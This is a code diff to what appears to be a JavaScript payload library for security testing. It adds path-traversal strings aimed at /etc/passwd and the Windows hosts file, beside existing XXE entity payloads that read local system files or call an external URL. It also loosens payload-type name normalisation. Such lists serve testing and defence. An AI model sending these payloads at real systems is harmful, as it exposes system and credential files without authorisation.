@@ -17,6 +17,12 @@ const payloadsByType = {
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://example.com/xxe">]><data>&xxe;</data>'
+  ],
+  pathtraversal: [
+    '../../../../etc/passwd',
+    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+    '%2e%2e%2fetc%2fpasswd',
+    '....//....//....//etc/passwd'
   ]
 };
 
@@ -29,7 +35,7 @@ function getPayloads(type) {
     return payloadsByType;
   }
 
-  const normalizedType = String(type).toLowerCase();
+  const normalizedType = String(type).toLowerCase().replace(/[\s_-]/g, '');
   if (!payloadsByType[normalizedType]) {
     throw new Error(`Unsupported payload type: ${type}`);
   }
